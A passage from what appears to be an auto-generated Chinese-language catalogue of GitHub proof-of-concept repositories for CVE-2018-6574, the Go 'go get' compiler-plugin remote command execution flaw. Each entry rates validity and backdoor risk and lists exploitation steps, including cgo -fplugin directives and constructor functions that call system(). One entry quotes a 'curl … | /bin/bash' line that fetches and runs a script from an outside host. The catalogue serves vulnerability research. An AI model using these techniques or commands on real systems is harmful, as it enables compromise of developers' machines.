**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
